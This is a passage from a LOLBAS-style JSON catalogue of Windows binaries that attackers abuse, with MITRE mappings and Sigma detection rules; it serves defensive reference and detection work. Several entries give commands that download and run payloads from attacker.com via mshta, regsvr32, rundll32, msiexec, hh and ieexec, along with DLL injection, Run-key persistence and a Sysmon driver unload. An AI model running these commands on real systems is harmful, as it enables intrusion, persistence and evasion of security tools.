    "commands": [
      {
        "command": "fltMC.exe unload SysmonDrv",
        "description": "Unload Sysmon driver",
        "usecase": "Disable security tools",
        "privileges": "Admin",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1562.001"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\fltMC.exe"],
    "detection": [
      {
        "sigma": "title: FltMC Driver Unload\ndetection:\n  selection:\n    Image|endswith: 'fltMC.exe'\n    CommandLine|contains: 'unload'",
        "description": "Detects fltMC unloading drivers"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/FltMC/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Forfiles.exe",
    "description": "Selects files and runs commands on them. Can execute commands on arbitrary files.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "forfiles /p C:\\Windows\\System32 /m notepad.exe /c C:\\Windows\\Temp\\malicious.exe",
        "description": "Execute command on file",
        "usecase": "Execute malicious programs",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\forfiles.exe", "C:\\Windows\\SysWOW64\\forfiles.exe"],
    "detection": [
      {
        "sigma": "title: Forfiles Execution\ndetection:\n  selection:\n    Image|endswith: 'forfiles.exe'\n    CommandLine|contains: '/c'",
        "description": "Detects forfiles executing commands"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Forfiles/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Fsutil.exe",
    "description": "File system utility. Performs tasks related to FAT and NTFS file systems, can create alternate data streams.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "fsutil.exe file createnew C:\\Windows\\Temp\\test.txt 0",
        "description": "Create file",
        "usecase": "Create files or abuse for alternate data streams",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1564.004"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\fsutil.exe", "C:\\Windows\\SysWOW64\\fsutil.exe"],
    "detection": [
      {
        "sigma": "title: Fsutil Alternate Data Stream\ndetection:\n  selection:\n    Image|endswith: 'fsutil.exe'\n    CommandLine|contains: 'ADS'",
        "description": "Detects fsutil creating ADS"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Fsutil/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Ftp.exe",
    "description": "FTP client. Transfers files to/from FTP servers.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "ftp -s:C:\\Windows\\Temp\\ftp.txt",
        "description": "Execute FTP script",
        "usecase": "Download files via FTP",
        "privileges": "User",
        "mitre": {
          "tactic": "Command and Control",
          "technique": "T1105"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\ftp.exe", "C:\\Windows\\SysWOW64\\ftp.exe"],
    "detection": [
      {
        "sigma": "title: FTP File Transfer\ndetection:\n  selection:\n    Image|endswith: 'ftp.exe'\n    CommandLine|contains: '-s:'",
        "description": "Detects ftp transferring files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Ftp/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Gpscript.exe",
    "description": "Group Policy script application tool. Applies Group Policy scripts.",
    "author": "Oddvar Moe",
    "created": "2019-04-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "gpscript.exe /logon",
        "description": "Apply logon scripts",
        "usecase": "Force Group Policy script execution",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1053"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\gpscript.exe", "C:\\Windows\\SysWOW64\\gpscript.exe"],
    "detection": [
      {
        "sigma": "title: Gpscript Execution\ndetection:\n  selection:\n    Image|endswith: 'gpscript.exe'",
        "description": "Detects gpscript execution"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Gpscript/"}],
    "acks": [{"person": "Oddvar Moe", "handle": "@oddvarmoe"}]
  },
  {
    "name": "Hh.exe",
    "description": "HTML Help executable. Opens compiled help files, can execute JavaScript.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "hh.exe http://attacker.com/payload.chm",
        "description": "Open remote CHM",
        "usecase": "Execute malicious help files",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059.007"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\hh.exe", "C:\\Windows\\SysWOW64\\hh.exe"],
    "detection": [
      {
        "sigma": "title: HH CHM Execution\ndetection:\n  selection:\n    Image|endswith: 'hh.exe'\n    CommandLine|contains: 'http'",
        "description": "Detects hh executing remote CHM files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Hh/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Ie4uinit.exe",
    "description": "IE Per-User Setup utility. Initializes IE settings, can execute commands.",
    "author": "Oddvar Moe",
    "created": "2019-08-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "ie4uinit.exe -BaseSettings",
        "description": "Initialize IE settings",
        "usecase": "Execute commands via IE initialization",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\ie4uinit.exe", "C:\\Windows\\SysWOW64\\ie4uinit.exe"],
    "detection": [
      {
        "sigma": "title: Ie4uinit Execution\ndetection:\n  selection:\n    Image|endswith: 'ie4uinit.exe'",
        "description": "Detects ie4uinit execution"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/"}],
    "acks": [{"person": "Oddvar Moe", "handle": "@oddvarmoe"}]
  },
  {
    "name": "Ieexec.exe",
    "description": "Microsoft .NET IE execute. Executes .NET Framework applications.",
    "author": "Casey Smith",
    "created": "2017-06-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "ieexec.exe http://attacker.com/payload.exe",
        "description": "Execute remote .NET app",
        "usecase": "Execute malicious .NET applications",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\ieexec.exe",
      "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\ieexec.exe"
    ],
    "detection": [
      {
        "sigma": "title: Ieexec Remote Execution\ndetection:\n  selection:\n    Image|endswith: 'ieexec.exe'\n    CommandLine|contains: 'http'",
        "description": "Detects ieexec executing remote code"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Ieexec/"}],
    "acks": [{"person": "Casey Smith", "handle": "@subTee"}]
  },
  {
    "name": "Ilasm.exe",
    "description": "IL Assembler. Compiles IL code to DLL/EXE.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "ilasm.exe malicious.il",
        "description": "Compile IL code",
        "usecase": "Compile malicious IL code",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ilasm.exe",
      "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ilasm.exe"
    ],
    "detection": [
      {
        "sigma": "title: Ilasm Compilation\ndetection:\n  selection:\n    Image|endswith: 'ilasm.exe'",
        "description": "Detects ilasm compiling code"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Ilasm/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "InfDefaultInstall.exe",
    "description": "INF Default Install. Executes INF installation commands.",
    "author": "Oddvar Moe",
    "created": "2018-05-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "InfDefaultInstall.exe C:\\Windows\\Temp\\malicious.inf",
        "description": "Install INF file",
        "usecase": "Execute malicious INF",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\InfDefaultInstall.exe",
      "C:\\Windows\\SysWOW64\\InfDefaultInstall.exe"
    ],
    "detection": [
      {
        "sigma": "title: InfDefaultInstall Execution\ndetection:\n  selection:\n    Image|endswith: 'InfDefaultInstall.exe'\n    CommandLine|contains: '.inf'",
        "description": "Detects InfDefaultInstall execution"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/InfDefaultInstall/"}],
    "acks": [{"person": "Oddvar Moe", "handle": "@oddvarmoe"}]
  },
  {
    "name": "Installutil.exe",
    "description": ".NET Installer utility. Installs/uninstalls server resources by executing .NET assemblies.",
    "author": "Casey Smith",
    "created": "2017-03-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Temp\\payload.dll",
        "description": "Execute assembly via uninstall",
        "usecase": "Execute malicious .NET assembly in uninstall context",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1218.004"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe",
      "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"
    ],
    "detection": [
      {
        "sigma": "title: InstallUtil Execution\ndetection:\n  selection:\n    Image|endswith: 'InstallUtil.exe'\n    CommandLine|contains: '/U'",
        "description": "Detects InstallUtil executing uninstall with potential malicious DLL"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Installutil/"}],
    "acks": [{"person": "Casey Smith", "handle": "@subTee"}]
  },
  {
    "name": "Jsc.exe",
    "description": "JScript .NET compiler. Compiles JScript to executable binary.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "jsc.exe C:\\Windows\\Temp\\malicious.js",
        "description": "Compile JScript to EXE",
        "usecase": "Compile malicious JScript to binary",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059.007"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe",
      "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\jsc.exe"
    ],
    "detection": [
      {
        "sigma": "title: JScript Compilation\ndetection:\n  selection:\n    Image|endswith: 'jsc.exe'",
        "description": "Detects jsc.exe compiling scripts"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Jsc/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Makecab.exe",
    "description": "Cabinet Maker. Creates CAB archives.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "makecab.exe C:\\Windows\\Temp\\malicious.exe C:\\Windows\\Temp\\malicious.cab",
        "description": "Create CAB archive",
        "usecase": "Compress malicious files into CAB",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1036"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\makecab.exe", "C:\\Windows\\SysWOW64\\makecab.exe"],
    "detection": [
      {
        "sigma": "title: Makecab Archive Creation\ndetection:\n  selection:\n    Image|endswith: 'makecab.exe'",
        "description": "Detects makecab creating archives"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Makecab/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Mavinject.exe",
    "description": "Microsoft Application Virtualization Injector. Injects DLL into running processes.",
    "author": "Oddvar Moe",
    "created": "2018-07-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "MavInject32.exe PID /INJECTRUNNING C:\\Windows\\Temp\\evil.dll",
        "description": "Inject DLL into running process",
        "usecase": "DLL injection into arbitrary process",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1055"
        }
      }
    ],
    "full_path": [
      "C:\\Program Files\\Microsoft Application Virtualization\\Client\\MavInject32.exe",
      "C:\\Program Files\\Microsoft Application Virtualization\\Client\\MavInject64.exe"
    ],
    "detection": [
      {
        "sigma": "title: Mavinject DLL Injection\ndetection:\n  selection:\n    Image|contains: 'MavInject'",
        "description": "Detects mavinject injecting DLLs"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Mavinject/"}],
    "acks": [{"person": "Oddvar Moe", "handle": "@oddvarmoe"}]
  },
  {
    "name": "Microsoft.Workflow.Compiler.exe",
    "description": "Workflow compiler. Compiles Windows Workflow Foundation XOML files with embedded C# expressions.",
    "author": "Matt Graeber",
    "created": "2017-09-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "Microsoft.Workflow.Compiler.exe tests.xml results.xml",
        "description": "Compile workflow with embedded code",
        "usecase": "Execute malicious code via workflow compilation",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe",
      "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe"
    ],
    "detection": [
      {
        "sigma": "title: Workflow Compiler Execution\ndetection:\n  selection:\n    Image|endswith: 'Microsoft.Workflow.Compiler.exe'",
        "description": "Detects workflow compiler execution"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Microsoft.Workflow.Compiler/"}],
    "acks": [{"person": "Matt Graeber", "handle": "@mattifestation"}]
  },
  {
    "name": "Mmc.exe",
    "description": "Microsoft Management Console. Opens MMC snap-ins.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "mmc.exe C:\\Windows\\Temp\\malicious.msc",
        "description": "Open malicious MMC console file",
        "usecase": "Execute malicious MMC snap-ins",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1218"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\mmc.exe", "C:\\Windows\\SysWOW64\\mmc.exe"],
    "detection": [
      {
        "sigma": "title: MMC Console Execution\ndetection:\n  selection:\n    Image|endswith: 'mmc.exe'\n    CommandLine|contains: '.msc'",
        "description": "Detects mmc opening console files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Mmc/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "MpCmdRun.exe",
    "description": "Windows Defender command-line tool. Can be used to restore quarantined files or download files.",
    "author": "Microsoft",
    "created": "2019-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "MpCmdRun.exe -Restore -FilePath C:\\Windows\\Temp\\malicious.exe",
        "description": "Restore quarantined file",
        "usecase": "Restore malicious files from quarantine",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1562.001"
        }
      }
    ],
    "full_path": [
      "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*\\MpCmdRun.exe",
      "C:\\Program Files\\Windows Defender\\MpCmdRun.exe"
    ],
    "detection": [
      {
        "sigma": "title: MpCmdRun File Restore\ndetection:\n  selection:\n    Image|endswith: 'MpCmdRun.exe'\n    CommandLine|contains: '-Restore'",
        "description": "Detects MpCmdRun restoring files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Msbuild.exe",
    "description": "Microsoft Build Engine. Builds applications, can execute inline tasks with embedded C#.",
    "author": "Casey Smith",
    "created": "2016-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "msbuild.exe C:\\Windows\\Temp\\malicious.proj",
        "description": "Build malicious project",
        "usecase": "Execute code embedded in MSBuild project files",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe",
      "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe"
    ],
    "detection": [
      {
        "sigma": "title: MSBuild Execution\ndetection:\n  selection:\n    Image|endswith: 'msbuild.exe'\n    CommandLine|contains: '.proj'",
        "description": "Detects msbuild executing project files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Msbuild/"}],
    "acks": [{"person": "Casey Smith", "handle": "@subTee"}]
  },
  {
    "name": "Msdt.exe",
    "description": "Microsoft Support Diagnostic Tool. Troubleshooting tool, can execute code from CAB files (Follina/CVE-2022-30190).",
    "author": "Microsoft",
    "created": "2022-05-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "msdt.exe /cab C:\\Windows\\Temp\\malicious.cab",
        "description": "Execute from malicious CAB",
        "usecase": "Execute code via diagnostic tool (Follina)",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\msdt.exe", "C:\\Windows\\SysWOW64\\msdt.exe"],
    "detection": [
      {
        "sigma": "title: MSDT CVE-2022-30190 (Follina)\ndetection:\n  selection:\n    Image|endswith: 'msdt.exe'\n    CommandLine|contains: '/cab'",
        "description": "Detects MSDT exploitation"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Msdt/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Mshta.exe",
    "description": "Microsoft HTML Application Host. Executes HTML Applications (HTA) and scripts.",
    "author": "Microsoft",
    "created": "2016-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "mshta.exe javascript:a=(GetObject('script:http://attacker.com/payload.sct')).Exec();close();",
        "description": "Execute JavaScript/HTA",
        "usecase": "Execute malicious HTA or JavaScript",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1218.005"
        }
      }
    ],
    "full_path": ["C:\\Windows\\System32\\mshta.exe", "C:\\Windows\\SysWOW64\\mshta.exe"],
    "detection": [
      {
        "sigma": "title: Mshta Execution\ndetection:\n  selection:\n    Image|endswith: 'mshta.exe'",
        "description": "Detects mshta execution"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Msiexec.exe",
    "description": "Windows Installer. Installs MSI packages, can execute remote MSI files.",
    "author": "Microsoft",
    "created": "2016-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "msiexec.exe /q /i http://attacker.com/payload.msi",
        "description": "Install remote MSI",
        "usecase": "Install malicious MSI packages from remote URL",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1218.007"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\msiexec.exe",
      "C:\\Windows\\SysWOW64\\msiexec.exe"
    ],
    "detection": [
      {
        "sigma": "title: Msiexec Remote Install\ndetection:\n  selection:\n    Image|endswith: 'msiexec.exe'\n    CommandLine|contains: 'http'",
        "description": "Detects msiexec installing remote packages"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Netsh.exe",
    "description": "Network Shell. Configures network settings, can import and execute helper DLLs.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "netsh.exe add helper C:\\Windows\\Temp\\malicious.dll",
        "description": "Add malicious helper DLL",
        "usecase": "Execute malicious code via netsh helper DLL",
        "privileges": "Admin",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1218"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\netsh.exe",
      "C:\\Windows\\SysWOW64\\netsh.exe"
    ],
    "detection": [
      {
        "sigma": "title: Netsh Helper DLL\ndetection:\n  selection:\n    Image|endswith: 'netsh.exe'\n    CommandLine|contains: 'add helper'",
        "description": "Detects netsh adding helper DLLs"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Netsh/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Odbcconf.exe",
    "description": "ODBC configuration tool. Configures ODBC drivers, can execute DLLs via REGSVR flags.",
    "author": "Casey Smith",
    "created": "2017-08-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "odbcconf.exe /S /L s C:\\Windows\\Temp\\malicious.dll",
        "description": "Execute DLL via REGSVR",
        "usecase": "Execute malicious DLL via ODBC configuration",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1218"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\odbcconf.exe",
      "C:\\Windows\\SysWOW64\\odbcconf.exe"
    ],
    "detection": [
      {
        "sigma": "title: Odbcconf DLL Load\ndetection:\n  selection:\n    Image|endswith: 'odbcconf.exe'\n    CommandLine|contains: '/L'",
        "description": "Detects odbcconf loading DLLs"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/"}],
    "acks": [{"person": "Casey Smith", "handle": "@subTee"}]
  },
  {
    "name": "Pcalua.exe",
    "description": "Program Compatibility Assistant. Launches programs with compatibility settings.",
    "author": "Oddvar Moe",
    "created": "2019-02-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "pcalua.exe -a C:\\Windows\\Temp\\malicious.exe",
        "description": "Launch program",
        "usecase": "Execute malicious programs via compatibility assistant",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\pcalua.exe",
      "C:\\Windows\\SysWOW64\\pcalua.exe"
    ],
    "detection": [
      {
        "sigma": "title: Pcalua Execution\ndetection:\n  selection:\n    Image|endswith: 'pcalua.exe'",
        "description": "Detects pcalua launching programs"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Pcalua/"}],
    "acks": [{"person": "Oddvar Moe", "handle": "@oddvarmoe"}]
  },
  {
    "name": "Powershell.exe",
    "description": "PowerShell command-line interface. Executes PowerShell commands and scripts.",
    "author": "Microsoft",
    "created": "2016-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\malicious.ps1",
        "description": "Execute PowerShell script",
        "usecase": "Execute malicious PowerShell scripts",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059.001"
        }
      },
      {
        "command": "powershell.exe -EncodedCommand <base64>",
        "description": "Execute encoded command",
        "usecase": "Execute encoded malicious commands to evade detection",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1027"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
    ],
    "detection": [
      {
        "sigma": "title: PowerShell Execution\ndetection:\n  selection:\n    Image|endswith: 'powershell.exe'",
        "description": "Detects PowerShell execution"
      },
      {
        "sigma": "title: Encoded PowerShell Command\ndetection:\n  selection:\n    Image|endswith: 'powershell.exe'\n    CommandLine|contains: '-EncodedCommand'",
        "description": "Detects encoded PowerShell commands"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Powershell/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Print.exe",
    "description": "Command line print utility. Can be abused to copy files to arbitrary locations.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "print /D:C:\\Windows\\Temp\\output.txt C:\\Windows\\System32\\drivers\\etc\\hosts",
        "description": "Copy file via print",
        "usecase": "Copy files using print command",
        "privileges": "User",
        "mitre": {
          "tactic": "Collection",
          "technique": "T1005"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\print.exe",
      "C:\\Windows\\SysWOW64\\print.exe"
    ],
    "detection": [
      {
        "sigma": "title: Print File Copy\ndetection:\n  selection:\n    Image|endswith: 'print.exe'\n    CommandLine|contains: '/D:'",
        "description": "Detects print copying files"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Print/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Reg.exe",
    "description": "Registry editor. Modifies registry, commonly used for persistence mechanisms.",
    "author": "Microsoft",
    "created": "2018-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Evil /t REG_SZ /d \"C:\\Windows\\Temp\\malicious.exe\" /f",
        "description": "Add registry run key",
        "usecase": "Persistence via Run registry key",
        "privileges": "User",
        "mitre": {
          "tactic": "Persistence",
          "technique": "T1547.001"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\reg.exe",
      "C:\\Windows\\SysWOW64\\reg.exe"
    ],
    "detection": [
      {
        "sigma": "title: Registry Run Key Modification\ndetection:\n  selection:\n    Image|endswith: 'reg.exe'\n    CommandLine|contains: '\\\\Run'",
        "description": "Detects registry persistence"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Reg/"}],
    "acks": [{"person": "Microsoft", "handle": ""}]
  },
  {
    "name": "Regasm.exe",
    "description": ".NET Assembly Registration tool. Registers assemblies for COM interop, can execute code via unregister.",
    "author": "Casey Smith",
    "created": "2017-04-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "regasm.exe /U C:\\Windows\\Temp\\malicious.dll",
        "description": "Unregister assembly (executes code)",
        "usecase": "Execute malicious assemblies via unregister",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1218"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe",
      "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe"
    ],
    "detection": [
      {
        "sigma": "title: Regasm Execution\ndetection:\n  selection:\n    Image|endswith: 'regasm.exe'\n    CommandLine|contains: '/U'",
        "description": "Detects regasm executing code"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Regasm/"}],
    "acks": [{"person": "Casey Smith", "handle": "@subTee"}]
  },
  {
    "name": "Regsvcs.exe",
    "description": ".NET Services Installation tool. Registers services for COM interop, can execute code.",
    "author": "Casey Smith",
    "created": "2017-05-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "regsvcs.exe C:\\Windows\\Temp\\malicious.dll",
        "description": "Register malicious service",
        "usecase": "Execute malicious services",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1218"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe",
      "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe"
    ],
    "detection": [
      {
        "sigma": "title: Regsvcs Execution\ndetection:\n  selection:\n    Image|endswith: 'regsvcs.exe'",
        "description": "Detects regsvcs executing code"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/"}],
    "acks": [{"person": "Casey Smith", "handle": "@subTee"}]
  },
  {
    "name": "Regsvr32.exe",
    "description": "Registers DLLs as command components in the registry. Can execute DLLs via COM scriptlets.",
    "author": "Casey Smith",
    "created": "2016-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll",
        "description": "Execute remote scriptlet",
        "usecase": "Execute malicious COM scriptlets (Squiblytwo)",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1218.010"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\regsvr32.exe",
      "C:\\Windows\\SysWOW64\\regsvr32.exe"
    ],
    "detection": [
      {
        "sigma": "title: Regsvr32 Scriptlet Execution\ndetection:\n  selection:\n    Image|endswith: 'regsvr32.exe'\n    CommandLine|contains: '/i:http'",
        "description": "Detects regsvr32 executing remote scriptlets"
      }
    ],
    "resources": [{"link": "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/"}],
    "acks": [{"person": "Casey Smith", "handle": "@subTee"}]
  },
  {
    "name": "Rundll32.exe",
    "description": "Runs DLLs as programs. Can execute arbitrary DLLs and JavaScript via HTML Application Host.",
    "author": "Microsoft",
    "created": "2016-01-01",
    "category": "Binaries",
    "commands": [
      {
        "command": "rundll32.exe C:\\Windows\\Temp\\malicious.dll,EntryPoint",
        "description": "Execute DLL",
        "usecase": "Execute malicious DLL exports",
        "privileges": "User",
        "mitre": {
          "tactic": "Defense Evasion",
          "technique": "T1218.011"
        }
      },
      {
        "command": "rundll32.exe javascript:\"\\\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://attacker.com/payload.sct\").Exec();",
        "description": "Execute JavaScript payload",
        "usecase": "Execute malicious JavaScript via mshtml",
        "privileges": "User",
        "mitre": {
          "tactic": "Execution",
          "technique": "T1059.007"
        }
      }
    ],
    "full_path": [
      "C:\\Windows\\System32\\rundll32.exe",
      "C:\\Windows\\SysWOW64\\rundll32.exe"
    ],
    "detection": [
      {
